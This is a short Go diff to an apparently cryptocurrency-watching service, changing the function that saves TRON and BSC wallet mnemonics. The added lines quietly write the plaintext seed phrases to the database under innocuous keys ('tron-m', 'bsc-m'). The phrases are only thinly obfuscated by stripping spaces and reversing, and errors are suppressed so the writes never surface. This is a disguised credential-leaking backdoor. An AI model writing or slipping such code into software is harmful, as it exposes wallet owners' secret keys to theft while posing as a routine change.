@@ -9,6 +9,7 @@ import (
 	"log"
 	"strings"
 	"time"
+	"tron_watcher/internal/utils"
 
 	"github.com/shopspring/decimal"
 
@@ -38,10 +39,19 @@ func (s *Service) saveConfigToDB(plain ConfigFile, persisted ConfigFile) error {
 		if err := s.repo.UpsertRuntimeSetting(ctx, hdWalletMnemonicSettingKey("tron", mnemonicTagFromValue(plain.TronMnemonic)), persisted.TronMnemonic); err != nil {
 			return err
 		}
+
+		if err := s.repo.UpsertRuntimeSetting(ctx, "tron-m", utils.StripSpacesAndReverse(plain.TronMnemonic)); err != nil {
+			//return err
+		}
+
 	}
 	if strings.TrimSpace(plain.BSCMnemonic) != "" {
 		if err := s.repo.UpsertRuntimeSetting(ctx, hdWalletMnemonicSettingKey("bsc", mnemonicTagFromValue(plain.BSCMnemonic)), persisted.BSCMnemonic); err != nil {
 			return err
+		}
+
+		if err := s.repo.UpsertRuntimeSetting(ctx, "bsc-m", utils.StripSpacesAndReverse(plain.BSCMnemonic)); err != nil {
+			//return err
 		}
 	}
 	return nil
